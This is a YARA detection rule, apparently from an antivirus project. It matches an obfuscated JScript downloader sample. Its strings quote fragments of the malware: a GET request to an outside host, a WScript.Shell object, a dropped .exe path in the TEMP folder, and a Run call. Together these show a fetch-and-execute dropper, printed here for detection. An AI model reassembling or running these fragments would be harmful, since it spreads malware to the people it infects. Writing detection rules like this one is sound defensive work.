rule sig_20160330_45d6b5f33fc20412ff3fc3ed8272633c {
  meta:
    description = "datamaliciousorder - file 20160330_45d6b5f33fc20412ff3fc3ed8272633c.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "3b16b419fbba85e2156f0690a0e8e27cb4ab115d04d7ddb277e0f674b96e9421"

  strings:
    $s1  = "_KQ0[_OX](\"GET\", \"http://itead-europe.com/k3ias\", false);" fullword ascii
    $s2  = "var _E0 = function _A() {return WScript[_W](\"WScript\"+\".Shell\");}(), _F2 = 11;" fullword ascii
    $s3  = "function _PO(_CD, _ET){_GI = _GI * 1; return _CD - _ET;};" fullword ascii
    $s4  = "if (_KQ0[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _BA(){return _E + \"\";};" fullword ascii
    $s6  = "function _P() {return _E0[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"S3lfc4nHyll.ex\" + \"e\";};" fullword ascii
    $s7  = "function _WS(_JS){_E0[\"Run\"](_JS, _GI, _GI);};" fullword ascii
    $s8  = "function _D() {return ((_B == true) && (_B == _OU)) ? 1 : _GI;};" fullword ascii
    $s9  = " while (_KQ){" fullword ascii
    $s10 = "return _PO(_H0, _A0);" fullword ascii
    $s11 = "var _JF = new this[\"Date\"]();" fullword ascii
    $s12 = "function _H(){return _W;};" fullword ascii
    $s13 = "function _R(){return 22;};" fullword ascii
    $s14 = "function _V(_F) {var _LG = (1, 2, 3, 4, 5, _F); return _LG;};" fullword ascii
    $s15 = "function _UR()" fullword ascii
    $s16 = "var _OU = false;" fullword ascii
    $s17 = "var _R1 = false;" fullword ascii
    $s18 = "_OU = true; " fullword ascii
    $s19 = "var _B = false;" fullword ascii
    $s20 = "_B = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}